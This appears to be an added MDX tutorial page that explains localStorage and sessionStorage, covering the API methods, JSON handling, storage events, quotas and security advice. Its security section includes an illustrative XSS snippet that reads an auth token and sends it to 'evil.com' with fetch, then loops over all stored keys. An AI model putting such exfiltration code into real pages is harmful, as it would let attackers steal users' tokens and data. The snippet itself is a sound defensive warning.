@@ -1,0 +1,980 @@
+---
+title: "localStorage & sessionStorage: Web Storage in JavaScript"
+sidebarTitle: "localStorage & sessionStorage"
+description: "Master Web Storage APIs in JavaScript. Learn localStorage vs sessionStorage, JSON serialization, storage events, security best practices, and when to use each."
+---
+
+How do you keep a user's dark mode preference when they return to your site? Why does your shopping cart persist across browser sessions, but form data vanishes when you close a tab? How do modern web apps remember state without constantly calling the server?
+
+```javascript
+// Save user preference - persists forever (until cleared)
+localStorage.setItem("theme", "dark")
+
+// Retrieve the preference later
+const theme = localStorage.getItem("theme")  // "dark"
+
+// Temporary data - gone when tab closes
+sessionStorage.setItem("formDraft", "Hello...")
+
+// Check what's stored
+console.log(localStorage.length)  // 1
+console.log(sessionStorage.length)  // 1
+```
+
+The answer is the **[Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)**. It's one of the most practical browser APIs you'll use daily, and understanding when to use `localStorage` vs `sessionStorage` will make your applications more user-friendly and performant.
+
+<Info>
+**What you'll learn in this guide:**
+- The difference between [`localStorage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage) and [`sessionStorage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)
+- The complete Web Storage API (`setItem`, `getItem`, `removeItem`, `clear`, `key`, `length`)
+- Storing complex data with [JSON](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON) serialization
+- Storage events for cross-tab communication
+- Storage limits, quotas, and private browsing behavior
+- Security considerations and XSS prevention
+- When to use Web Storage vs cookies vs IndexedDB
+</Info>
+
+<Warning>
+**Prerequisites:** This guide assumes you're familiar with the [DOM](/concepts/dom) and basic JavaScript objects. Understanding [JSON](/beyond/concepts/json-deep-dive) will help with the serialization sections.
+</Warning>
+
+---
+
+## What is Web Storage in JavaScript?
+
+**[Web Storage](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)** is a browser API that allows JavaScript to store key-value pairs locally in the user's browser. Unlike cookies, stored data is never sent to the server with HTTP requests. Web Storage provides two mechanisms: `localStorage` for persistent storage that survives browser restarts, and `sessionStorage` for temporary storage that is cleared when the browser tab closes.
+
+Here's the key insight: Web Storage is synchronous, string-only, and scoped to the origin (protocol + domain + port). These constraints make it simple to use but require understanding for effective implementation.
+
+<Note>
+Web Storage has been available in all major browsers since July 2015. It's part of the HTML5 specification and is considered a "Baseline" feature—meaning you can rely on it working everywhere.
+</Note>
+
+---
+
+## The Hotel Storage Analogy
+
+Think of browser storage like staying at a hotel:
+
+**localStorage** is like a **permanent storage locker** at the hotel. You rent it once, and your belongings stay there even if you leave and come back months later. The only way items disappear is if you remove them yourself or the hotel clears them out.
+
+**sessionStorage** is like the **safe in your hotel room**. It's convenient and secure while you're staying, but the moment you check out (close the tab), everything in the safe is cleared. Each room (tab) has its own separate safe.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     WEB STORAGE: THE HOTEL ANALOGY                           │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   localStorage                          sessionStorage                       │
+│   ═══════════                          ══════════════                        │
+│                                                                              │
+│   ┌─────────────────┐                  ┌─────────────────┐                   │
+│   │ STORAGE LOCKER  │                  │   ROOM SAFE     │                   │
+│   │                 │                  │                 │                   │
+│   │  ┌───────────┐  │                  │  ┌───────────┐  │                   │
+│   │  │ Theme:    │  │                  │  │ Form:     │  │                   │
+│   │  │ "dark"    │  │                  │  │ "draft"   │  │                   │
+│   │  ├───────────┤  │                  │  └───────────┘  │                   │
+│   │  │ User:     │  │                  │                 │                   │
+│   │  │ "Alice"   │  │                  │  Cleared when   │                   │
+│   │  └───────────┘  │                  │  tab closes     │                   │
+│   │                 │                  │                 │                   │
+│   │  Persists       │                  └─────────────────┘                   │
+│   │  forever        │                                                        │
+│   └─────────────────┘                  Each tab has its own safe!            │
+│                                                                              │
+│   Shared across ALL                    ┌─────────┐ ┌─────────┐               │
+│   tabs and windows                     │ Tab 1   │ │ Tab 2   │               │
+│   from same origin                     │ Safe A  │ │ Safe B  │               │
+│                                        └─────────┘ └─────────┘               │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+This is exactly how Web Storage works:
+- **localStorage**: Shared across all tabs/windows from the same origin, persists until explicitly cleared
+- **sessionStorage**: Isolated to each tab, cleared when the tab closes
+
+---
+
+## localStorage vs sessionStorage Comparison
+
+Both APIs share the exact same methods, but their behavior differs significantly:
+
+| Feature | localStorage | sessionStorage |
+|---------|-------------|----------------|
+| **Persistence** | Until explicitly cleared | Until tab/window closes |
+| **Scope** | Shared across all tabs/windows | Isolated to single tab |
+| **Survives browser restart** | Yes | No |
+| **Survives page refresh** | Yes | Yes |
+| **Storage limit** | ~5-10 MB per origin | ~5-10 MB per origin |
+| **Accessible from** | Any tab with same origin | Only the originating tab |
+
+### When to Use Each
+
+<Tabs>
+  <Tab title="Use localStorage for">
+    ```javascript
+    // User preferences that should persist
+    localStorage.setItem("theme", "dark")
+    localStorage.setItem("language", "en")
+    localStorage.setItem("fontSize", "16px")
+    
+    // Recently viewed items
+    const recentItems = ["item1", "item2", "item3"]
+    localStorage.setItem("recentlyViewed", JSON.stringify(recentItems))
+    
+    // Feature flags or A/B test assignments
+    localStorage.setItem("experiment_checkout_v2", "true")
+    ```
+  </Tab>
+  <Tab title="Use sessionStorage for">
+    ```javascript
+    // Form data that shouldn't persist after session
+    sessionStorage.setItem("checkoutStep", "2")
+    sessionStorage.setItem("formDraft", JSON.stringify(formData))
+    
+    // Temporary navigation state
+    sessionStorage.setItem("scrollPosition", "450")
+    sessionStorage.setItem("lastSearchQuery", "javascript tutorials")
+    
+    // One-time messages or notifications
+    sessionStorage.setItem("welcomeShown", "true")
+    ```
+  </Tab>
+</Tabs>
+
+---
+
+## The Web Storage API
+
+Both `localStorage` and `sessionStorage` implement the [`Storage`](https://developer.mozilla.org/en-US/docs/Web/API/Storage) interface, providing identical methods:
+
+### setItem(key, value)
+
+Stores a key-value pair. If the key already exists, updates the value.
+
+```javascript
+// Basic usage
+localStorage.setItem("username", "alice")
+sessionStorage.setItem("sessionId", "abc123")
+
+// Overwrites existing value
+localStorage.setItem("username", "bob")  // Now "bob"
+```
+
+### getItem(key)
+
+Retrieves the value for a key. Returns `null` if the key doesn't exist.
+
+```javascript
+const username = localStorage.getItem("username")  // "bob"
+const missing = localStorage.getItem("nonexistent")  // null
+
+// Common pattern: provide default value
+const theme = localStorage.getItem("theme") || "light"
+```
+
+### removeItem(key)
+
+Removes a specific key-value pair.
+
+```javascript
+localStorage.removeItem("username")
+localStorage.getItem("username")  // null
+```
+
+### clear()
+
+Removes ALL key-value pairs from storage.
+
+```javascript
+// Clear everything - use with caution!
+localStorage.clear()
+sessionStorage.clear()
+```
+
+### key(index)
+
+Returns the key at a given index. Useful for iterating.
+
+```javascript
+localStorage.setItem("a", "1")
+localStorage.setItem("b", "2")
+
+localStorage.key(0)  // "a" (order not guaranteed)
+localStorage.key(1)  // "b"
+localStorage.key(99)  // null (index out of bounds)
+```
+
+### length
+
+Property that returns the number of stored items.
+
+```javascript
+localStorage.clear()
+localStorage.setItem("x", "1")
+localStorage.setItem("y", "2")
+
+console.log(localStorage.length)  // 2
+```
+
+### Complete Example
+
+```javascript
+// A simple storage utility
+function demonstrateStorageAPI() {
+  // Clear previous data
+  localStorage.clear()
+  
+  // Store some items
+  localStorage.setItem("name", "Alice")
+  localStorage.setItem("role", "Developer")
+  localStorage.setItem("level", "Senior")
+  
+  console.log("Items stored:", localStorage.length)  // 3
+  
+  // Read an item
+  console.log("Name:", localStorage.getItem("name"))  // "Alice"
+  
+  // Update an item
+  localStorage.setItem("level", "Lead")
+  console.log("Updated level:", localStorage.getItem("level"))  // "Lead"
+  
+  // Iterate over all items
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i)
+    const value = localStorage.getItem(key)
+    console.log(`${key}: ${value}`)
+  }
+  
+  // Remove one item
+  localStorage.removeItem("role")
+  console.log("After removal:", localStorage.length)  // 2
+  
+  // Clear everything
+  localStorage.clear()
+  console.log("After clear:", localStorage.length)  // 0
+}
+```
+
+---
+
+## Storing Complex Data with JSON
+
+Web Storage can only store strings. When you try to store other types, they're automatically converted to strings—often with unexpected results:
+
+```javascript
+// Numbers become strings
+localStorage.setItem("count", 42)
+typeof localStorage.getItem("count")  // "string", value is "42"
+
+// Booleans become strings
+localStorage.setItem("isActive", true)
+localStorage.getItem("isActive")  // "true" (string, not boolean!)
+
+// Objects become "[object Object]" - NOT useful!
+localStorage.setItem("user", { name: "Alice" })
+localStorage.getItem("user")  // "[object Object]" - data lost!
+
+// Arrays become comma-separated strings
+localStorage.setItem("items", [1, 2, 3])
+localStorage.getItem("items")  // "1,2,3" (string, not array)
+```
+
+### The Solution: JSON.stringify and JSON.parse
+
+Use [`JSON.stringify()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify) when storing and [`JSON.parse()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse) when retrieving:
+
+```javascript
+// Storing objects
+const user = { name: "Alice", age: 30, roles: ["admin", "user"] }
+localStorage.setItem("user", JSON.stringify(user))
+
+// Retrieving objects
+const storedUser = JSON.parse(localStorage.getItem("user"))
+console.log(storedUser.name)  // "Alice"
+console.log(storedUser.roles)  // ["admin", "user"]
+
+// Storing arrays
+const favorites = ["item1", "item2", "item3"]
+localStorage.setItem("favorites", JSON.stringify(favorites))
+
+const storedFavorites = JSON.parse(localStorage.getItem("favorites"))
+console.log(storedFavorites[0])  // "item1"
+```
+
+### A Safer Storage Wrapper
+
+Create a utility that handles JSON automatically and provides safe defaults:
+
+```javascript
+const storage = {
+  set(key, value) {
+    try {
+      localStorage.setItem(key, JSON.stringify(value))
+      return true
+    } catch (error) {
+      console.error("Storage set failed:", error)
+      return false
+    }
+  },
+  
+  get(key, defaultValue = null) {
+    try {
+      const item = localStorage.getItem(key)
+      return item ? JSON.parse(item) : defaultValue
+    } catch (error) {
+      console.error("Storage get failed:", error)
+      return defaultValue
+    }
+  },
+  
+  remove(key) {
+    localStorage.removeItem(key)
+  },
+  
+  clear() {
+    localStorage.clear()
+  }
+}
+
+// Usage - much cleaner!
+storage.set("user", { name: "Alice", premium: true })
+const user = storage.get("user")  // { name: "Alice", premium: true }
+const missing = storage.get("nonexistent", { guest: true })  // { guest: true }
+```
+
+### JSON Gotchas
+
+Be aware of these limitations when using JSON serialization:
+
+```javascript
+// Date objects become strings
+const data = { created: new Date() }
+localStorage.setItem("data", JSON.stringify(data))
+const parsed = JSON.parse(localStorage.getItem("data"))
+console.log(typeof parsed.created)  // "string", not Date object!
+
+// To fix: parse dates manually
+parsed.created = new Date(parsed.created)
+
+// undefined values are lost
+const obj = { a: 1, b: undefined }
+JSON.stringify(obj)  // '{"a":1}' - 'b' is gone!
+
+// Functions are not serializable
+const withFunction = { greet: () => "hello" }
+JSON.stringify(withFunction)  // '{}' - function is gone!
+
+// Circular references throw errors
+const circular = { name: "test" }
+circular.self = circular
+JSON.stringify(circular)  // TypeError: Converting circular structure to JSON
+```
+
+---
+
+## Storage Events for Cross-Tab Communication
+
+The [`storage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/storage_event) event fires when storage is modified from **another** document (tab/window) with the same origin. This enables cross-tab communication.
+
+<Warning>
+**Important:** The storage event does NOT fire in the tab that made the change—only in OTHER tabs. This is a common source of confusion!
+</Warning>
+
+```javascript
+// Listen for storage changes from other tabs
+window.addEventListener("storage", (event) => {
+  console.log("Storage changed!")
+  console.log("Key:", event.key)           // The key that changed
+  console.log("Old value:", event.oldValue)  // Previous value
+  console.log("New value:", event.newValue)  // New value
+  console.log("URL:", event.url)           // URL of the document that changed it
+  console.log("Storage area:", event.storageArea)  // localStorage or sessionStorage
+})
+```
+
+### The StorageEvent Properties
+
+| Property | Description |
+|----------|-------------|
+| `key` | The key that was changed (`null` if `clear()` was called) |
+| `oldValue` | The previous value (`null` if new key) |
+| `newValue` | The new value (`null` if key was removed) |
+| `url` | The URL of the document that made the change |
+| `storageArea` | The Storage object that was modified |
+
+### Practical Example: Syncing Logout Across Tabs
+
+```javascript
+// In your authentication module
+function setupAuthSync() {
+  window.addEventListener("storage", (event) => {
+    // User logged out in another tab
+    if (event.key === "authToken" && event.newValue === null) {
+      console.log("User logged out in another tab")
+      window.location.href = "/login"
+    }
+    
+    // User logged in another tab
+    if (event.key === "authToken" && event.oldValue === null) {
+      console.log("User logged in from another tab")
+      window.location.reload()
+    }
+  })
+}
+
+// When user logs out
+function logout() {
+  localStorage.removeItem("authToken")  // This triggers event in OTHER tabs
+  window.location.href = "/login"
+}
+```
+
+### Testing Storage Events
+
+Since storage events only fire in other tabs, here's how to test manually:
+
+1. Open your site in two browser tabs
+2. Open DevTools console in both tabs
+3. In Tab 1, add the event listener:
+   ```javascript
+   window.addEventListener("storage", (e) => console.log("Changed:", e.key))
+   ```
+4. In Tab 2, modify storage:
+   ```javascript
+   localStorage.setItem("test", "value")
+   ```
+5. Tab 1's console will show: `Changed: test`
+
+---
+
+## Storage Limits and Quotas
+
+Web Storage has size limits that vary by browser:
+
+| Browser | localStorage Limit | sessionStorage Limit |
+|---------|-------------------|---------------------|
+| Chrome | ~5 MB | ~5 MB |
+| Firefox | ~5 MB | ~5 MB |
+| Safari | ~5 MB | ~5 MB |
+| Edge | ~5 MB | ~5 MB |
+
+<Note>
+The limit is per **origin** (protocol + domain + port), not per page. All pages on `https://example.com` share the same 5 MB quota.
+</Note>
+
+### Handling QuotaExceededError
+
+When you exceed the limit, `setItem()` throws a [`QuotaExceededError`](https://developer.mozilla.org/en-US/docs/Web/API/DOMException):
+
+```javascript
+function safeSetItem(key, value) {
+  try {
+    localStorage.setItem(key, value)
+    return true
+  } catch (error) {
+    if (error.name === "QuotaExceededError") {
+      console.error("Storage quota exceeded!")
+      // Handle gracefully: clear old data, notify user, etc.
+      return false
+    }
+    throw error  // Re-throw unexpected errors
+  }
+}
+
+// Usage
+const largeData = "x".repeat(10 * 1024 * 1024)  // 10 MB string
+if (!safeSetItem("largeData", largeData)) {
+  console.log("Failed to save - storage full")
+}
+```
+
+### Private Browsing / Incognito Mode
+
+Web Storage behaves differently in private browsing:
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    PRIVATE BROWSING BEHAVIOR                                 │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   Browser        Behavior in Private Mode                                    │
+│   ───────────────────────────────────────────────────────────────────────    │
+│   Safari         localStorage throws QuotaExceededError on ANY write         │
+│   Chrome         localStorage works but cleared when window closes           │
+│   Firefox        localStorage works but cleared when window closes           │
+│   Edge           localStorage works but cleared when window closes           │
+│                                                                              │
+│   All browsers: sessionStorage works normally but cleared on close           │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+Always use feature detection to handle these cases gracefully.
+
+---
+
+## Feature Detection
+
+Always check if Web Storage is available before using it:
+
+```javascript
+function storageAvailable(type) {
+  try {
+    const storage = window[type]
+    const testKey = "__storage_test__"
+    storage.setItem(testKey, testKey)
+    storage.removeItem(testKey)
+    return true
+  } catch (error) {
+    return (
+      error instanceof DOMException &&
+      error.name === "QuotaExceededError" &&
+      // Acknowledge QuotaExceededError only if there's something already stored
+      storage && storage.length !== 0
+    )
+  }
+}
+
+// Usage
+if (storageAvailable("localStorage")) {
+  // Safe to use localStorage
+  localStorage.setItem("key", "value")
+} else {
+  // Fall back to cookies, memory storage, or inform user
+  console.warn("localStorage not available")
+}
+
+if (storageAvailable("sessionStorage")) {
+  // Safe to use sessionStorage
+  sessionStorage.setItem("key", "value")
+}
+```
+
+---
+
+## Security Considerations
+
+<Warning>
+**Critical Security Warning:** Never store sensitive data in Web Storage. localStorage is vulnerable to XSS (Cross-Site Scripting) attacks. Any JavaScript running on your page can access localStorage—including malicious scripts injected by attackers.
+</Warning>
+
+### What NOT to Store
+
+```javascript
+// NEVER store these in localStorage or sessionStorage:
+localStorage.setItem("password", "secret123")        // Passwords
+localStorage.setItem("creditCard", "4111111111111111")  // Payment info
+localStorage.setItem("ssn", "123-45-6789")           // Personal identifiers
+localStorage.setItem("authToken", "jwt.token.here")  // Auth tokens (use HTTP-only cookies)
+localStorage.setItem("apiKey", "sk-abc123")          // API keys
+```
+
+### Why localStorage is Vulnerable
+
+```javascript
+// If an attacker can inject JavaScript (XSS), they can:
+const stolenData = localStorage.getItem("authToken")
+// Send to attacker's server
+fetch("https://evil.com/steal?token=" + stolenData)
+
+// Or steal ALL stored data
+for (let i = 0; i < localStorage.length; i++) {
+  const key = localStorage.key(i)
+  const value = localStorage.getItem(key)
+  // Exfiltrate everything...
+}
+```
+
+### Best Practices
+
+1. **Store only non-sensitive data**: User preferences, UI state, cached public data
+2. **Use HTTP-only cookies for authentication**: Tokens, session IDs
+3. **Implement Content Security Policy (CSP)**: Prevent XSS attacks
+4. **Sanitize all user input**: Never trust data from users
+5. **Consider encryption for semi-sensitive data**: Though this adds complexity
+
+For comprehensive security guidance, see the [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage).
+
+---
+
+## When to Use Which Storage Solution
+
+Choosing the right storage depends on your use case:
+
+| Need | Best Solution | Why |
+|------|---------------|-----|
+| User preferences (theme, language) | localStorage | Persists across sessions |
+| Shopping cart | localStorage | User expects it to persist |
+| Form wizard progress | sessionStorage | Temporary, per-tab data |
+| Authentication tokens | HTTP-only cookies | Secure from JavaScript |
+| Large structured data (>5MB) | IndexedDB | No size limit, async |
+| Data server needs to read | Cookies | Sent with every request |
+| Offline-first apps | IndexedDB + Service Workers | Full offline support |
+| Caching API responses | localStorage or Cache API | Depends on size/complexity |
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     STORAGE DECISION FLOWCHART                               │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   Does the server need to read it?                                           │
+│        │                                                                     │
+│        ├── YES → Use Cookies                                                 │
+│        │                                                                     │
+│        └── NO → Is it sensitive data (tokens, passwords)?                    │
+│                     │                                                        │
+│                     ├── YES → Use HTTP-only Cookies                          │
+│                     │                                                        │
+│                     └── NO → Is data > 5MB or complex/indexed?               │
+│                                  │                                           │
+│                                  ├── YES → Use IndexedDB                     │
+│                                  │                                           │
+│                                  └── NO → Should it persist across sessions? │
+│                                               │                              │
+│                                               ├── YES → Use localStorage     │
+│                                               │                              │
+│                                               └── NO → Use sessionStorage    │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Common Patterns and Use Cases
+
+### Theme/Dark Mode Preference
+
+```javascript
+// Save theme preference
+function setTheme(theme) {
+  document.documentElement.setAttribute("data-theme", theme)
+  localStorage.setItem("theme", theme)
+}
+
+// Load theme on page load
+function loadTheme() {
+  const savedTheme = localStorage.getItem("theme")
+  const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches
+  const theme = savedTheme || (prefersDark ? "dark" : "light")
+  setTheme(theme)
+}
+
+// Toggle theme
+function toggleTheme() {
+  const current = localStorage.getItem("theme") || "light"
+  setTheme(current === "light" ? "dark" : "light")
+}
+```
+
+### Multi-Step Form Wizard
+
+```javascript
+// Save form progress in sessionStorage (clears when tab closes)
+function saveFormProgress(step, data) {
+  const progress = JSON.parse(sessionStorage.getItem("formProgress") || "{}")
+  progress[step] = data
+  progress.currentStep = step
+  sessionStorage.setItem("formProgress", JSON.stringify(progress))
+}
+
+// Restore form progress
+function loadFormProgress() {
+  const progress = JSON.parse(sessionStorage.getItem("formProgress") || "{}")
+  return progress
+}
+
+// Clear on successful submission
+function clearFormProgress() {
+  sessionStorage.removeItem("formProgress")
+}
+```
+
+### Recently Viewed Items
+
+```javascript
+function addToRecentlyViewed(item, maxItems = 10) {
+  const recent = JSON.parse(localStorage.getItem("recentlyViewed") || "[]")
+  
+  // Remove if already exists (to move to front)
+  const filtered = recent.filter((i) => i.id !== item.id)
+  
+  // Add to front
+  filtered.unshift(item)
+  
+  // Keep only maxItems
+  const trimmed = filtered.slice(0, maxItems)
+  
+  localStorage.setItem("recentlyViewed", JSON.stringify(trimmed))
+}
+
+function getRecentlyViewed() {
+  return JSON.parse(localStorage.getItem("recentlyViewed") || "[]")
+}
+```
+
+---
+
+## Common Mistakes and Pitfalls
+
+<AccordionGroup>
+  <Accordion title="1. Forgetting JSON.stringify/parse">
+    ```javascript
+    // WRONG - stores "[object Object]"
+    localStorage.setItem("user", { name: "Alice" })
+    
+    // CORRECT
+    localStorage.setItem("user", JSON.stringify({ name: "Alice" }))
+    const user = JSON.parse(localStorage.getItem("user"))
+    ```
+  </Accordion>
+  
+  <Accordion title="2. Not handling null from getItem">
+    ```javascript
+    // DANGEROUS - JSON.parse(null) returns null, but other code might fail
+    const settings = JSON.parse(localStorage.getItem("settings"))
+    settings.theme  // TypeError if settings is null!
+    
+    // SAFE - provide default
+    const settings = JSON.parse(localStorage.getItem("settings")) || {}
+    const theme = settings.theme || "light"
+    ```
+  </Accordion>
+  
+  <Accordion title="3. Assuming storage is always available">
+    ```javascript
+    // WRONG - will crash in private browsing (Safari)
+    localStorage.setItem("key", "value")
+    
+    // CORRECT - check first
+    if (storageAvailable("localStorage")) {
+      localStorage.setItem("key", "value")
+    }
+    ```
+  </Accordion>
+  
+  <Accordion title="4. Not handling QuotaExceededError">
+    ```javascript
+    // WRONG - might throw
+    localStorage.setItem("bigData", hugeString)
+    
+    // CORRECT - catch the error
+    try {
+      localStorage.setItem("bigData", hugeString)
+    } catch (e) {
+      if (e.name === "QuotaExceededError") {
+        // Handle gracefully
+      }
+    }
+    ```
+  </Accordion>
+  
+  <Accordion title="5. Storing sensitive data">
+    ```javascript
+    // NEVER DO THIS
+    localStorage.setItem("authToken", token)
+    localStorage.setItem("password", password)
+    
+    // Use HTTP-only cookies for auth instead
+    ```
+  </Accordion>
+  
+  <Accordion title="6. Expecting storage event in the same tab">
+    ```javascript
+    // This listener will NOT fire from changes in the SAME tab
+    window.addEventListener("storage", handler)
+    localStorage.setItem("test", "value")  // handler NOT called!
+    
+    // Storage events only fire in OTHER tabs with the same origin
+    ```
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Key Takeaways
+
+<Info>
+**The key things to remember about localStorage and sessionStorage:**
+
+1. **Web Storage stores key-value string pairs** — Both localStorage and sessionStorage provide simple, synchronous access to browser storage scoped by origin
+
+2. **localStorage persists forever; sessionStorage clears on tab close** — Choose based on whether data should survive the session
+
+3. **Both are scoped to origin** — Protocol + domain + port; different origins can't access each other's storage
+
+4. **Only strings can be stored** — Use `JSON.stringify()` when saving and `JSON.parse()` when retrieving objects and arrays
+
+5. **Storage events enable cross-tab communication** — The event fires in OTHER tabs, not the one making the change
+
+6. **~5-10 MB limit per origin** — Handle `QuotaExceededError` gracefully
+
+7. **Private browsing may restrict storage** — Safari throws errors; others clear on close
+
+8. **Never store sensitive data** — localStorage is vulnerable to XSS attacks; use HTTP-only cookies for authentication
+
+9. **Always use feature detection** — Check availability before using, especially for private browsing compatibility
+
+10. **Choose the right storage for the job** — localStorage for preferences, sessionStorage for temporary state, cookies for server-readable data, IndexedDB for large data
+</Info>
+
+---
+
+## Test Your Knowledge
+
+<AccordionGroup>
+  <Accordion title="Question 1: What's the key difference between localStorage and sessionStorage?">
+    **Answer:**
+    
+    `localStorage` persists until explicitly cleared—data survives browser restarts and remains until you call `removeItem()` or `clear()`. 
+    
+    `sessionStorage` is cleared when the browser tab closes. Each tab has its own isolated sessionStorage, while localStorage is shared across all tabs from the same origin.
+  </Accordion>
+  
+  <Accordion title="Question 2: Why do you need JSON.stringify when storing objects?">
+    **Answer:**
+    
+    Web Storage can only store strings. When you try to store an object directly, it gets converted to the string `"[object Object]"`, losing all your data.
+    
+    `JSON.stringify()` converts objects and arrays to JSON strings that can be stored and later restored with `JSON.parse()`.
+    
+    ```javascript
+    // Wrong - data lost
+    localStorage.setItem("user", { name: "Alice" })  // "[object Object]"
+    
+    // Correct - data preserved
+    localStorage.setItem("user", JSON.stringify({ name: "Alice" }))  // '{"name":"Alice"}'
+    ```
+  </Accordion>
+  
+  <Accordion title="Question 3: Which tab receives the storage event—the one making the change or other tabs?">
+    **Answer:**
+    
+    **Other tabs only.** The storage event fires in all tabs/windows with the same origin EXCEPT the one that made the change. This is by design to enable cross-tab communication without causing infinite loops.
+    
+    If you need to react to changes in the same tab, you'll need to implement that logic separately from the storage event.
+  </Accordion>
+  
+  <Accordion title="Question 4: What error is thrown when storage quota is exceeded?">
+    **Answer:**
+    
+    `QuotaExceededError` (a type of `DOMException`). You should wrap `setItem()` calls in try-catch when storing potentially large data:
+    
+    ```javascript
+    try {
+      localStorage.setItem("key", largeValue)
+    } catch (e) {
+      if (e.name === "QuotaExceededError") {
+        // Storage is full
+      }
+    }
+    ```
+  </Accordion>
+  
+  <Accordion title="Question 5: Is it safe to store JWT tokens in localStorage? Why or why not?">
+    **Answer:**
+    
+    **No, it's not safe.** localStorage is vulnerable to XSS (Cross-Site Scripting) attacks. Any JavaScript running on your page can read localStorage—including malicious scripts injected by attackers.
+    
+    Authentication tokens should be stored in **HTTP-only cookies**, which cannot be accessed by JavaScript. This makes them immune to XSS attacks (though CSRF protection is still needed).
+  </Accordion>
+  
+  <Accordion title="Question 6: How can you check if localStorage is available?">
+    **Answer:**
+    
+    Use feature detection with try-catch, because localStorage might be disabled, unavailable, or throw errors in private browsing mode:
+    
+    ```javascript
+    function storageAvailable(type) {
+      try {
+        const storage = window[type]
+        const testKey = "__test__"
+        storage.setItem(testKey, testKey)
+        storage.removeItem(testKey)
+        return true
+      } catch (e) {
+        return false
+      }
+    }
+    
+    if (storageAvailable("localStorage")) {
+      // Safe to use
+    }
+    ```
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Related Concepts
+
+<CardGroup cols={2}>
+  <Card title="IndexedDB" icon="database" href="/beyond/concepts/indexeddb">
+    For larger, structured data with indexes and queries
+  </Card>
+  <Card title="Cookies" icon="cookie" href="/beyond/concepts/cookies">
+    For server-accessible storage and authentication
+  </Card>
+  <Card title="JSON Deep Dive" icon="code" href="/beyond/concepts/json-deep-dive">
+    Master JSON serialization for complex data storage
+  </Card>
+  <Card title="DOM" icon="window" href="/concepts/dom">
+    Understanding the browser document object model
+  </Card>
+</CardGroup>
+
+---
+
+## References
+
+<CardGroup cols={2}>
+  <Card title="Web Storage API — MDN" icon="book" href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API">
+    Complete MDN documentation for the Web Storage API with examples and browser compatibility
+  </Card>
+  <Card title="localStorage — MDN" icon="book" href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage">
+    Official reference for localStorage including exceptions, security considerations, and examples
+  </Card>
+  <Card title="sessionStorage — MDN" icon="book" href="https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage">
+    Official reference for sessionStorage behavior, tab isolation, and page session lifecycle
+  </Card>
+  <Card title="StorageEvent — MDN" icon="book" href="https://developer.mozilla.org/en-US/docs/Web/API/StorageEvent">
+    Reference for the storage event interface used for cross-tab communication
+  </Card>
+</CardGroup>
+
+---
+
+## Articles
+
+<CardGroup cols={2}>
+  <Card title="LocalStorage, sessionStorage — javascript.info" icon="newspaper" href="https://javascript.info/localstorage">
+    Comprehensive tutorial with interactive examples covering all Web Storage concepts. Great for hands-on learning.
+  </Card>
+  <Card title="Introduction to localStorage and sessionStorage — DigitalOcean" icon="newspaper" href="https://www.digitalocean.com/community/tutorials/js-introduction-localstorage-sessionstorage">
+    Step-by-step guide covering basic to advanced usage patterns with practical code examples.
+  </Card>
+  <Card title="Using the Web Storage API — MDN" icon="newspaper" href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API">
+    Official MDN guide with feature detection patterns and complete working examples.
+  </Card>
+  <Card title="OWASP HTML5 Security Cheat Sheet" icon="shield" href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage">
+    Security best practices for Web Storage from the Open Web Application Security Project.
+  </Card>
+</CardGroup>
+
+---
+
+## Videos
+
+<CardGroup cols={2}>
+  <Card title="JavaScript Cookies vs Local Storage vs Session Storage" icon="video" href="https://www.youtube.com/watch?v=GihQAC1I39Q">
+    Web Dev Simplified's clear comparison of all three client-side storage mechanisms with practical examples.
+  </Card>
+  <Card title="Local Storage & Session Storage — JavaScript Tutorial" icon="video" href="https://www.youtube.com/watch?v=AUOzvFzdIk4">
+    Traversy Media's beginner-friendly tutorial walking through all Web Storage API methods.
+  </Card>
+  <Card title="localStorage in 100 Seconds" icon="video" href="https://www.youtube.com/watch?v=XPDcw1bYQbs">
+    Fireship's quick overview of localStorage fundamentals. Perfect for a fast refresher.
+  </Card>
+</CardGroup>
